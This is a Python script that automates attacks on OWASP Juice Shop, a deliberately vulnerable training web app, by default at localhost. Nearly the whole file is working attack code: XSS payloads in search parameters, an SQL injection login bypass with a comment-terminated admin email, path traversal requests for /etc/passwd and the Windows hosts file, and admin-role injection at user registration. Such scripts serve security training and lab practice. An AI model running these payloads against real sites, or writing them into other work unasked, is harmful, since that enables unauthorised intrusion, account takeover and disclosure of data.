#!/usr/bin/env python3
"""
OWASP Juice Shop Challenge Solver
Educational tool for learning web security concepts

USAGE:
    python juice_shop_solver.py                    # Run all solvers against localhost:3000
    python juice_shop_solver.py --url http://...   # Use custom Juice Shop URL
    python juice_shop_solver.py --list             # List available challenges
    python juice_shop_solver.py --challenge NAME   # Solve specific challenge

REQUIREMENTS:
    - OWASP Juice Shop running (default: http://localhost:3000)
    - Python 3.6+
    - requests library (auto-installed if missing)

EXAMPLES:
    python juice_shop_solver.py --url http://192.168.1.100:3000
    python juice_shop_solver.py --list
"""

# Auto-install requests if not available
try:
    import requests
except ImportError:
    print("Installing required package: requests")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

import json
import time
import re
from urllib.parse import urljoin
from typing import Dict, List, Optional

class JuiceShopSolver:
    def __init__(self, base_url: str = "http://localhost:3000"):
        """Initialize the Juice Shop solver with base URL"""
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.challenges = {}
        self.solved_challenges = []
        
    def check_connection(self) -> bool:
        """Check if Juice Shop is accessible"""
        try:
            print(f"🔗 Testing connection to: {self.base_url}")
            response = self.session.get(self.base_url, timeout=10)
            print(f"📊 Connection Status Code: {response.status_code}")
            print(f"📏 Response Length: {len(response.text)} bytes")
            
            success = response.status_code == 200
            if success:
                print(f"✅ Connection successful!")
            else:
                print(f"❌ Connection failed!")
                
            return success
        except requests.RequestException as e:
            print(f"❌ Connection exception: {e}")
            return False
    
    def get_challenges(self) -> Dict:
        """Retrieve all available challenges"""
        try:
            url = urljoin(self.base_url, '/api/Challenges/')
            print(f"🔗 Fetching challenges from: {url}")
            response = self.session.get(url)
            print(f"📊 Challenges API Status Code: {response.status_code}")
            print(f"📏 Response Length: {len(response.text)} bytes")
            
            if response.status_code == 200:
                challenges_data = response.json()
                self.challenges = {c['name']: c for c in challenges_data['data']}
                print(f"📋 Successfully loaded {len(self.challenges)} challenges")
                return self.challenges
            else:
                print(f"❌ Failed to fetch challenges")
                if response.text:
                    print(f"📄 Error response: {response.text[:200]}...")
                    
        except requests.RequestException as e:
            print(f"❌ Challenges request exception: {e}")
        return {}
    
    def register_user(self, email: str, password: str) -> bool:
        """Register a new user"""
        url = urljoin(self.base_url, '/api/Users/')
        data = {
            'email': email,
            'password': password,
            'passwordRepeat': password,
            'securityQuestion': {'id': 1, 'question': 'Your eldest siblings middle name?'},
            'securityAnswer': 'test'
        }
        try:
            response = self.session.post(url, json=data)
            return response.status_code == 201
        except requests.RequestException:
            return False
    
    def login(self, email: str, password: str) -> bool:
        """Login with credentials"""
        url = urljoin(self.base_url, '/rest/user/login')
        data = {'email': email, 'password': password}
        try:
            response = self.session.post(url, json=data)
            if response.status_code == 200:
                auth_data = response.json()
                token = auth_data.get('authentication', {}).get('token')
                if token:
                    self.session.headers.update({'Authorization': f'Bearer {token}'})
                    return True
        except requests.RequestException:
            pass
        return False
    
    def solve_dom_xss(self) -> bool:
        """Solve DOM XSS challenge"""
        try:
            # DOM XSS in search functionality
            url = urljoin(self.base_url, '/#/search?q=<iframe src="javascript:alert(`xss`)"></iframe>')
            print(f"   🔗 Requesting: {url}")
            response = self.session.get(url)
            print(f"   📊 Status Code: {response.status_code}")
            print(f"   📏 Response Length: {len(response.text)} bytes")
            
            success = response.status_code == 200
            if success:
                print(f"   ✅ DOM XSS payload delivered successfully")
            else:
                print(f"   ❌ Request failed")
                
            return success
        except requests.RequestException as e:
            print(f"   ❌ Request exception: {e}")
            return False
    
    def solve_sql_injection_login(self) -> bool:
        """Solve SQL injection login bypass"""
        url = urljoin(self.base_url, '/rest/user/login')
        # Classic SQL injection payload
        data = {
            'email': "admin@juice-sh.op'--",
            'password': 'anything'
        }
        try:
            print(f"   🔗 Requesting: {url}")
            print(f"   📤 Payload: {json.dumps(data, indent=2)}")
            response = self.session.post(url, json=data)
            print(f"   📊 Status Code: {response.status_code}")
            print(f"   📏 Response Length: {len(response.text)} bytes")
            
            success = response.status_code == 200 and 'authentication' in response.text
            if success:
                print(f"   ✅ SQL Injection successful - authentication token found")
                # Extract and show token info
                try:
                    resp_json = response.json()
                    if 'authentication' in resp_json:
                        token = resp_json['authentication'].get('token', 'N/A')[:50] + '...'
                        print(f"   🔑 Token: {token}")
                except:
                    pass
            else:
                print(f"   ❌ SQL Injection failed")
                if response.text:
                    print(f"   📄 Response preview: {response.text[:200]}...")
                    
            return success
        except requests.RequestException as e:
            print(f"   ❌ Request exception: {e}")
            return False
    
    def solve_path_traversal(self) -> bool:
        """Solve path traversal challenge"""
        paths = [
            '/ftp/../../../etc/passwd',
            '/ftp/../../../windows/system32/drivers/etc/hosts',
            '/ftp/package.json.bak/../../../package.json'
        ]
        
        for i, path in enumerate(paths, 1):
            try:
                url = urljoin(self.base_url, path)
                print(f"   🔗 Attempting path {i}/{len(paths)}: {url}")
                response = self.session.get(url)
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                if response.status_code == 200:
                    print(f"   ✅ Path traversal successful!")
                    print(f"   📄 Response preview: {response.text[:100]}...")
                    return True
                else:
                    print(f"   ❌ Path failed")
                    
            except requests.RequestException as e:
                print(f"   ❌ Request exception: {e}")
                continue
                
        print(f"   ❌ All path traversal attempts failed")
        return False
    
    def solve_xss_in_search(self) -> bool:
        """Solve XSS in search functionality"""
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            '"><script>alert(document.domain)</script>'
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                url = urljoin(self.base_url, f'/rest/products/search?q={payload}')
                print(f"   🔗 Attempting XSS {i}/{len(payloads)}: {url}")
                print(f"   📤 Payload: {payload}")
                response = self.session.get(url)
                print(f"   📊 Status Code: {response.status_code}")
                print(f"   📏 Response Length: {len(response.text)} bytes")
                
                if response.status_code == 200:
                    print(f"   ✅ XSS payload accepted!")
                    print(f"   📄 Response preview: {response.text[:150]}...")
                    return True
                else:
                    print(f"   ❌ XSS payload rejected")
                    
            except requests.RequestException as e:
                print(f"   ❌ Request exception: {e}")
                continue
                
        print(f"   ❌ All XSS attempts failed")
        return False
    
    def solve_admin_registration(self) -> bool:
        """Solve admin registration challenge"""
        try:
            # Register as admin by manipulating the role field
            url = urljoin(self.base_url, '/api/Users/')
            data = {
                'email': f'admin{int(time.time())}@juice-sh.op',  # Unique email
                'password': 'Admin123!',
                'passwordRepeat': 'Admin123!',
                'role': 'admin',  # This is the key - adding admin role
                'securityQuestion': {
                    'id': 1,
                    'question': 'Your eldest siblings middle name?'
                },
                'securityAnswer': 'test'
            }
            
            print(f"   🔗 Requesting: {url}")
            print(f"   📤 Payload: {json.dumps(data, indent=2)}")
            response = self.session.post(url, json=data)
            print(f"   📊 Status Code: {response.status_code}")
            print(f"   📏 Response Length: {len(response.text)} bytes")
            
            # Check if registration was successful
            if response.status_code == 201:
                print(f"   ✅ Admin user registered successfully")
                try:
                    resp_json = response.json()
                    user_id = resp_json.get('id', 'N/A')
                    user_email = resp_json.get('email', 'N/A')
                    user_role = resp_json.get('role', 'N/A')
                    print(f"   👤 Created User ID: {user_id}")
                    print(f"   📧 Email: {user_email}")
                    print(f"   🔐 Role: {user_role}")
                except Exception as e:
                    print(f"   📄 Response JSON parse error: {e}")
                    print(f"   📄 Raw response: {response.text[:300]}...")
                return True
            else:
                print(f"   ❌ Registration failed with status: {response.status_code}")
                if response.text:
                    print(f"   📄 Error response: {response.text[:300]}...")
                return False
                
        except requests.RequestException as e:
            print(f"   ❌ Request exception: {e}")
            return False
    
    def get_solved_challenges(self) -> List[str]:
        """Get list of solved challenges"""
        try:
            url = urljoin(self.base_url, '/api/Challenges/')
            response = self.session.get(url)
            if response.status_code == 200:
                challenges = response.json()['data']
                solved = [c['name'] for c in challenges if c.get('solved')]
                self.solved_challenges = solved
                return solved
        except requests.RequestException:
            pass
        return []
    
    def run_all_solvers(self) -> Dict[str, bool]:
        """Run all challenge solvers"""
        results = {}
        
        print("Starting Juice Shop challenge solving...")
        
        if not self.check_connection():
            print(f"❌ Cannot connect to Juice Shop at {self.base_url}")
            return results
        
        print(f"✅ Connected to Juice Shop at {self.base_url}")
        
        # Get available challenges
        challenges = self.get_challenges()
        
        # Define solvers
        solvers = {
            'DOM XSS': self.solve_dom_xss,
            'SQL Injection Login': self.solve_sql_injection_login,
            'Path Traversal': self.solve_path_traversal,
            'XSS in Search': self.solve_xss_in_search,
            'Admin Registration': self.solve_admin_registration
        }
        
        # Run each solver
        for name, solver in solvers.items():
            print(f"🔄 Attempting: {name}")
            try:
                success = solver()
                results[name] = success
                status = "✅ Solved" if success else "❌ Failed"
                print(f"   {status}: {name}")
                time.sleep(1)  # Rate limiting
            except Exception as e:
                print(f"   ❌ Error in {name}: {e}")
                results[name] = False
        
        # Check solved challenges
        solved = self.get_solved_challenges()
        print(f"\n🏆 Total challenges solved: {len(solved)}")
        
        return results

def main():
    """Main function to run the solver"""
    import argparse
    
    parser = argparse.ArgumentParser(description='OWASP Juice Shop Challenge Solver')
    parser.add_argument('--url', default='http://localhost:3000', 
                       help='Juice Shop URL (default: http://localhost:3000)')
    parser.add_argument('--challenge', help='Solve specific challenge')
    parser.add_argument('--list', action='store_true', 
                       help='List available challenges')
    
    args = parser.parse_args()
    
    solver = JuiceShopSolver(args.url)
    
    if args.list:
        challenges = solver.get_challenges()
        print("Available challenges:")
        for name, challenge in challenges.items():
            difficulty = challenge.get('difficulty', 'Unknown')
            print(f"  - {name} (Difficulty: {difficulty})")
        return
    
    if args.challenge:
        print(f"Solving specific challenge: {args.challenge}")
        # Add specific challenge solving logic here
        return
    
    # Run all solvers
    results = solver.run_all_solvers()
    
    # Print summary
    print("\n" + "="*50)
    print("SUMMARY")
    print("="*50)
    solved_count = sum(1 for success in results.values() if success)
    total_count = len(results)
    print(f"Solved: {solved_count}/{total_count} challenges")
    
    for challenge, success in results.items():
        status = "✅" if success else "❌"
        print(f"{status} {challenge}")

if __name__ == "__main__":
    main()